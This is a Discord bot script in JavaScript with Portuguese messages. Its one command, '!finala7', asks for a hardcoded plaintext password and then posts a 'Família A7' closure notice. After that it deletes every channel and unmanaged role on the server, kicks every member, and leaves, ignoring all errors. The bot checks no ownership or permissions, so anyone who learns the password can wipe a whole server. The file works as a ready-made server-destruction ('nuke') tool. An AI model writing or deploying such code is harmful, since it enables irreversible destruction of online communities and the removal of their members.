import { Client, GatewayIntentBits } from "discord.js";
import express from "express";

// ================= CONFIG =================
const TOKEN = process.env.TOKEN || process.env.DISCORD_TOKEN;
const PREFIX = "!";
const SENHA = "lm1234pcd";

// =============== TOKEN CHECK ===============
if (!TOKEN) {
  console.error("❌ TOKEN não definido no Render");
  process.exit(1);
}

// ================= CLIENT =================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages,
  ],
});

// ================= KEEP ALIVE ==============
const app = express();
app.get("/", (req, res) => res.send("Bot Final A7 online 🚨"));
app.listen(3000, () => console.log("KeepAlive ativo"));

// ================= READY ===================
client.once("ready", () => {
  console.log(`🤖 Logado como ${client.user.tag}`);
});

// ================= COMMAND =================
client.on("messageCreate", async (message) => {
  if (!message.guild) return;
  if (message.author.bot) return;

  if (message.content === `${PREFIX}finala7`) {
    await message.reply("🔐 Digite a senha para confirmar:");

    const filter = (m) => m.author.id === message.author.id;
    const collector = message.channel.createMessageCollector({
      filter,
      time: 30000,
      max: 1,
    });

    collector.on("collect", async (msg) => {
      if (msg.content !== SENHA) {
        return message.channel.send("❌ Senha incorreta. Operação cancelada.");
      }

      const aviso = `📢 ⚠️ **AVISO OFICIAL – LEIAM COM ATENÇÃO** ⚠️\n\nHoje chega ao fim um ciclo que marcou histórias, amizades e momentos inesquecíveis.\nApós muito tempo de existência, decisões difíceis e reflexões necessárias, informamos que a **FAMÍLIA A7 FOI OFICIALMENTE ENCERRADA**.\n\nA partir deste momento, todas as atividades estão finalizadas.\n\n🖤 **Família A7 – encerrada.**`;

      // ====== MANDAR NO PV (DM) ======
      try {
        await message.author.send(aviso);
      } catch {
        await message.channel.send("⚠️ Não consegui enviar DM (PV). O usuário pode ter DMs fechadas.");
      }

      // Também avisa no canal (opcional)
      await message.channel.send("✅ Confirmação recebida. Iniciando encerramento...");

      // APAGAR CANAIS
      for (const c of message.guild.channels.cache.values()) {
        try { await c.delete(); } catch {}
      }

      // APAGAR CARGOS
      for (const r of message.guild.roles.cache.values()) {
        if (r.managed) continue;
        try { await r.delete(); } catch {}
      }

      // EXPULSAR MEMBROS
      await message.guild.members.fetch();
      for (const m of message.guild.members.cache.values()) {
        if (m.id === client.user.id) continue;
        try { await m.kick("Encerramento Família A7"); } catch {}
      }

      // BOT SAI
      await message.guild.leave();
    });

    collector.on("end", (c) => {
      if (c.size === 0) {
        message.channel.send("⏰ Tempo esgotado. Cancelado.");
      }
    });
  }
});

// ================= LOGIN ===================
client.login(TOKEN);
